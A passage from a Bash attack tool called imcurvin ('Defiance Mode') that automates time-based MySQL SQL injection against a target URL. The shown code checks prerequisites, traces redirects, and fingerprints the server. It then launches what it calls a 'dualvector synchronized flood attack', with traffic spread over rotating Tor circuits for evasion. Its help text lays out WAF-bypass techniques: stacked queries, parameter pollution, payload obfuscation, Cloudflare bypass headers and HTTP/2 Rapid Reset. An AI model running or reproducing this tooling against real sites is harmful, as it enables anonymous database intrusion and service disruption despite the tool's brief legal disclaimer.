              if [[ ("$method" == "TRACE" || "$method" == "PUT") && "$m_code" == "200" ]]; then
                echo -e "\e[0;31m[i]\e[0m Method \033[31m%-8s\033[0m -> Status: \033[31m%s (High Risk)\033[0m" "$method" "$m_code"
              else
                echo -e "\e[0;32m[+]\e[0m Method \e[0;32m%-8s\e[0m -> Status: \e[0;32m%s\e[0m" "$method" "$m_code"
              fi
            else
              echo -e "\033[90m[-] Method %-8s -> Status: [Failed/Blocked]\033[0m" "$method"
            fi
            ) &
          done
          wait

          local whois_data=$(whois "$clean_domain" 2>/dev/null)
          local registrar=$(echo "$whois_data" | grep -Ei "^Registrar:" | head -n 1 | awk -F': ' '{print $2}' | xargs)

          if [ -n "$registrar" ]; then
            echo -e "\n[\033[34m$(date +%H:%M:%S)\033[0m] \e[0;32m[+]\e[0m Domain Registrar        : \e[0;32m${registrar}\e[0m"
          else
            echo -e "\n[\033[34m$(date +%H:%M:%S)\033[0m] \e[0;32m[+]\e[0m Domain Registrar        : \033[90m[Not Detected / Private]\033[0m"
          fi

          echo -e "\n[\033[34m$(date +%H:%M:%S)\033[0m] [i] Execution completed successfully."
          exit 0
        }
  helping() {
  echo -e "->>\n"
  echo -e "Usage: imcurvin -u <TARGET_URL> [OPTION]\n"
  echo -e "Available Options:"
  echo -e "  -u <URL>         : Specify the target website URL (Required)"
   echo -e "  -tech            : Display advanced technical methodologies and framework configurations (READ THIS IF YOU HAVE NOT YET, TO PREVENT UNINTENDED ACTIONS)"
  echo -e "  -cnf             : Automode (Passed directly to Defiance)"
  echo -e "  -rec             : Run environment reconnaissance"
  echo -e "  -shwpld          : Show payloads actively during execution"
  echo -e "  -val             : Enable post-scan Python validation engine for latency isolation"
  echo -e "  -cookie=<string> : Ingest custom session cookies (e.g., -cookie=\"PHPSESSID=123\")"
  echo -e "  -h               : Display this help guide"
  echo -e "\n->>"
  exit 0
}
show_tech() {
echo -e "===========================================\n"
    echo -e "\n\e[34mReconnaissance\e[0m"
    echo -e "* \e[1mHybrid URL Parsing\e[0m: Dynamically traces \e[1mPreFlight HTTP Redirections\e[0m to secure the absolute destination URL before passing it to localized multi-vector attack sequences."
    echo -e ""
    echo -e "* \e[1mGoogle Dorking Reconnaissance\e[0m: Automatically discovers additional vulnerable endpoints within the target domain to expand the attack surface."
    echo -e ""

    echo -e "\e[34mNetwork Evasion & Multi-Port TOR Routing\e[0m"
    echo -e "* \e[1mMulti-Port TOR Exporting\e[0m: Completely eliminates the typical single circuit TOR bottleneck by exporting \e[1mmultiple active TOR ports\e[0m simultaneously (such as \e[1m9050, 9052, and more\e[0m)."
    echo -e ""
    echo -e "* \e[1mLoad-Balanced Requests\e[0m: The Bash architecture randomly distributes parallel \e[1mMySQL attack threads\e[0m across \e[1m6 distinct TOR circuits\e[0m to balance outbound network traffic."
    echo -e ""
    echo -e "* \e[1mContinuous Identity Mutation\e[0m: Pushes evasion to its \"limits\" through \e[1mdynamic multi-IP TOR circuit rotations\e[0m per request combined with \e[1mautomated UserAgent mutations\e[0m on every concurrent thread."
    echo -e ""
    echo -e "* \e[1mRandomized Delay Insertion (Jitter)\e[0m: Introduces unpredictable, \e[1mnon-linear time intervals\e[0m between concurrent requests to destroy the traffic-pattern baselines of behavioral AI filters."
    echo -e ""

    echo -e "\e[34mAdvanced WAF Bypass & Obfuscation\e[0m"
    echo -e "The engine deploys a \e[1msynchronized dual-vector parallel attack\e[0m that simultaneously probes MySQL time-based anomalies using multi-layered payload obfuscation and intelligent header injection, featuring:"
    echo -e ""
    echo -e "* \e[1mStacked Queries Injection\e[0m: Utilizes the stacked query technique (\e[1m;\e[0m) to terminate the application's original database query and force the independent execution of injected dynamic SQL statements."
    echo -e ""
    echo -e "* \e[1mHTTP Parameter Pollution (HPP) Splitting\e[0m: Injects duplicated query parameters with identical names (\e[1mparam_name=999&param_name=payload\e[0m) to exploit parsing discrepancies between the front-end WAF and the back-end application server, effectively masking malicious database payloads behind benign values."
    echo -e ""
    echo -e "* \e[1mPayload Pen-Testing Masking\e[0m: Conceals detection signatures through \e[1mrandomized case conversion, space2comment encoding, XOR encryption\e[0m, and \e[1mBase64 encoding matrices\e[0m."
    echo -e ""
    echo -e "* \e[1mIntelligent Header Injection\e[0m: Injects spoofed IP headers, \e[1mCloudflare bypass chains\e[0m, and cache-control directives tailored specifically to complex URL parameter structures."
    echo -e ""
    echo -e "* \e[1mProtocol Exploitation\e[0m: Executes synchronized \e[1mJA3/JA4 TLS Fingerprint Spoofing, HTTP/2 Rapid Reset Protocol Exploitation\e[0m via a customizable high-concurrency window (defaulted to \e[1m50 concurrent streams\e[0m), \e[1mHTTP Chunked Transfer Encoding Mismatch\e[0m, and \e[1mAutomated Control Loop Shadowban Evasion\e[0m."
    echo -e ""

    echo -e "\e[34mAutomated IP Re-Birth via TOR NEWNYM\e[0m"
    echo -e "To ensure uninterrupted execution against active threat mitigation systems, imcurvin integrates an automated defensive evasion loop:"
    echo -e ""
    echo -e "* \e[1mBlock Detection\e[0m: If the target infrastructure responds with a block status (such as \e[1mHTTP 403 Forbidden\e[0m or \e[1m429 Too Many Requests\e[0m), the engine dynamically triggers a \e[1m\"SIGNAL NEWNYM\"\e[0m instruction across the active port array."
    echo -e ""
    echo -e "* \e[1mInstant Rotation\e[0m: Instantiates an immediate circuit teardown and rebuild, rotating the outbound exit node mapping \e[1mwithin milliseconds\e[0m without interrupting the primary multi-threaded attack vector."
    echo -e ""

    echo -e "\e[34mPost-Scan Validation Engine\e[0m"
    echo -e "* \e[1mLatency Isolation\e[0m: Every time-based anomaly generated during the attack is filtered by a specialized post-scan \e[1mPython validation engine\e[0m designed to isolate baseline network latency from genuine database thread delays."
    echo -e ""
    echo -e "* \e[1mEnvironment Safeguard\e[0m: The framework detects \e[1mnon-MySQL environments\e[0m and aborts execution to prevent \"resource wastage.\""
    echo -e ""
    exit 0
}
        print_defiance_logo
        if [[ "$tech" = "true" ]]; then
        show_tech
        fi

if [ -z "$target_url" ]; then
    echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Error: URL not specified."
    echo -e "\e[0;37m[\e[0mi\e[0;37m]\e[0m Please refer to the option guide below:\n"
    helping
    exit 1
fi

if [[ "$show_help" = "true" ]]; then
    helping
fi

for cmd in nc curl tor flock pgrep xxd; do
    case "$cmd" in
        nc)
            if ! command -v nc &> /dev/null && ! command -v netcat &> /dev/null; then
                echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: 'netcat' is not installed on your terminal."
                echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install netcat-openbsd first before running imCurvin'."
                exit 1
            fi
            ;;
        *)
            if ! command -v "$cmd" &> /dev/null; then
                echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: '$cmd' is not installed on your terminal."
                echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install $cmd first before running imCurvin'."
                exit 1
            fi
            ;;
    esac
done

if [[ "$recon" = "true" ]]; then
    reconi
fi

echo -e "\n[\033[34mWARNING\033[0m] ImCurvin is designed for \033[1mauthorized security testing and educational purposes only.\033[0m"
echo -e "Running this tool against targets without priorwritten consent is strictly illegal. \033[1mThe developer assumes no liability and not responsible for any misuse, damage, or system instability caused by this software.\033[0m By executing this script, you agree to these terms."
sleep 2 

echo -e "\n[\033[34m${ayamaa}\033[0m] [i]\e[0m Checking for TOR terminal service..."

if pgrep -x "tor" >/dev/null 2>&1; then
    echo -e "[\033[34m${ayamaa}\033[0m] [i] \033[1mTor terminal service detected as active.\033[0m"
else
    echo -e "[\033[34m${ayamaa}\033[0m] [->] WARNING: Tor terminal service is not detected/running."
    echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Run 'tor' command in a new terminal before using Defiance Mode."
    echo -e "[\033[34m${ayamaa}\033[0m] [->] Operation aborted due to environment mismatch."
    exit 1
fi

echo -e "[\033[34m${ayamaa}\033[0m] [i] Tracing target redirections."
recon_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
recon_proxy="--socks5-hostname 127.0.0.1:$recon_port"
initial_url="$target_url"

final_destination_url=$(curl "$recon_proxy" --connect-timeout 5 --retry 2 -m 8 -s -o /dev/null -w "%{url_effective}" -L "$initial_url")

if [ "$initial_url" != "$final_destination_url" ]; then
    echo -e "[\033[34m${ayamaa}\033[0m] [!] Target redirected to: \033[32m$final_destination_url\033[0m"           
    read -p "[?] Is this URL correct? (y/n): " user_confirm
    user_confirm=$(echo "$user_confirm" | tr '[:upper:]' '[:lower:]')

    case "$user_confirm" in
        y|yes)
            echo -e "[\033[34m${ayamaa}\033[0m] [->] Continue with Redirected URL."
            export target_url="$final_destination_url"
            ;;
        *)
            echo -e "[\033[31m${ayamaa}\033[0m] [i] Continue with default URL will result in an unwanted error,"
            clean_domain=$(echo "$target_url" | sed -e 's|^[^/]*//||' -e 's|/.*||' -e 's|:.*||')
            dork "$clean_domain"
            dork_status=$?             
            if [ $dork_status -ne 0 ]; then
                exit 1
            fi
            ;;
    esac
fi             

echo -e "[\033[34m${ayamaa}\033[0m] [i]\e[0m Testing connection to target URL."
http_status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$target_url")

case "$http_status" in
    000)
        echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Web Connection time out [10 Seconds]. The target URL might be very unstable."
        exit 1
        ;;
    2??|3??)
        ;;
    *)
        echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Target URL returned HTTP Status $http_status."
        exit 1
        ;;
esac                    
          if [ -f "$DEFIANCE_DIR/../validators/ayam.py" ]; then
    echo -e "[\033[34m${ayamaa}\033[0m] [i] Analyzing parameter.."
    
    eye_report=$(python3 "$DEFIANCE_DIR/../validators/ayam.py" "$target_url")
    param_type=$(echo "$eye_report" | cut -d'|' -f1)
    discovered_keys=$(echo "$eye_report" | cut -d'|' -f3)

    case "$param_type" in
        "QUERY_PARAM")
            echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m] \033[1mActive Query Parameters Spotted > ($discovered_keys)\033[0m"
            export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
            export REQ_METHOD="GET"
            export TARGET_PARAM=$(echo "$discovered_keys" | cut -d',' -f1)
            ;;
        "PATH_PARAM"|"NO_PARAM")
            echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Error: GET parameters not found [POST Method / Form Detected]."
            echo -e "[\033[34m${ayamaa}\033[0m] [i] Action Required: Please inspect the target's HTML form elements to identify valid parameters first."
            echo -e "\e[0;37m[-] Operation aborted to prevent invalid asset execution.\n"
            exit 1
            ;;
        *)
            if [[ "$target_url" != *"?"* ]]; then
                echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Error: GET parameters not found [POST Method / Form Detected]."
                echo -e "[\033[34m${ayamaa}\033[0m] [i] Action Required: Please inspect the target's HTML form elements to identify valid parameters first."
                echo -e "\e[0;37m[-] Operation aborted to prevent invalid asset execution.\n"
                exit 1
            else
                echo -e "[\033[34m${ayamaa}\033[0m] [i]\033[1m No parameters detected. Falling back to default.\033[0m"
                export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
                export REQ_METHOD="GET"
            fi
            ;;
    esac
fi

cookie_flag=""
if [ -n "$custom_cookie" ]; then
    cookie_flag="-b $custom_cookie"
    echo "[\033[34m${ayamaa}\033[0m] [i] Custom Cookie inputted: $custom_cookie"
fi

echo -e "[\033[34m${ayamaa}\033[0m] [i] Performing database environment verification.."
server_fingerprint=$(curl "$recon_proxy" -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")

if echo "$server_fingerprint" | grep -qEi "(oracle|postgre|mssql|microsoft-iis|supabase)"; then
    echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Target rejected, Non MySQL environment fingerprint."
    echo -e "[i] Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"
    echo -e "[\033[34m${ayamaa}\033[0m][->] Revert. Operation aborted to prevent structural asset wastage."
    exit 1
else
    echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m]\e[0m \033[1mTarget environment matches MySQL compliance directives.\033[0m"
fi

if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
    echo -e "[\033[34m${ayamaa}\033[0m] [i] This web envi is outdated/just a test, to ensure the payloads to be executed, \033[1mthe tamper has been downgraded \033[0m[Space2comment, randomcase only]."
fi

sleep 1

if [ "$enable_val" = "true" ] && [ -s "$ROOT_LOG_FILE" ]; then
    echo -e "[\033[34m${ayamaa}\033[0m] [?] Your log file is not empty."
    read -p "[\033[34m${ayamaa}\033[0m] Do you want to overwrite it? (y/n): " tanya
    tanya=$(echo "$tanya" | tr '[:upper:]' '[:lower:]')
    
    case "$tanya" in
        y|yes)
            > "$ROOT_LOG_FILE"
            echo -e "[\033[34m${ayamaa}\033[0m] [\033[34m+\e[0m] \033[1mLog overwritten.\033[0m\n"
            ;;
        *)
            echo -e "[\033[34m${ayamaa}\033[0m] [i] Previous log entries will also be scanned."
            ;;
    esac
fi

echo -e "[\033[34m${ayamaa}\033[0m] [i] Launching dualvector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"                 

          vector_sqli_agressor_left &
          pid_vector1=$!

          vector_sqli_agressor_right &
          pid_vector2=$!

          wait $pid_vector1 $pid_vector2

          echo -e "\n[\033[34m${ayamaa}\033[0m] [\033[1mCOMPLETE\033[0m]\e[0m Attack sequence completed. Input to Defiance Log Analyst.."
          sleep 1
          if [ "$enable_val" = "true" ]; then
            if [ -f "$DEFIANCE_DIR/../validators/defval.py" ]; then
              python "$DEFIANCE_DIR/../validators/defval.py"
            else
              echo -e "[\033[34m${ayamaa}\033[0m] [->] defval.py not found. Skipping validate."
            fi
          else
            echo -e "[\033[34m${ayamaa}\033[0m] [i] Skipping validating, use the option -val to enable it."
          fi

          echo ""
            
          
               


   
              
            